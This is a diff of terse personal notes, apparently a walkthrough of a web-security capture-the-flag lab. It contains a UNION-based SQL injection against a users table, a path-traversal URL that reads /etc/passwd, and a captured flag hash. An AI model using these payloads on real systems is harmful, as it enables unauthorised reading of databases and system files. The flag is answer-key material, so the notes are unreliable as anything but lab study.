@@ -65,4 +65,19 @@ just find all fields from table users and view this:
 	2) 1 union select Commentaire, countersign from users; -- after this request we see comment, which the looks like: "Decrypt this password -> then lower all the char. Sh256 on it and it's good !"
 
 
-####################### ###############################################
+#######################feedback comment ###############################################
+
+
+#########################path injection#################################################
+'Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 '
+http://192.168.99.104/index.php?page=../../../../../../../../../../../../../../etc/passwd
+
+
+##########################upload file#####################################################
+
+#########################.hidden file##################################################
+start parser.py
+########################foobar###################################################
+
+#######################media page###############################################
+
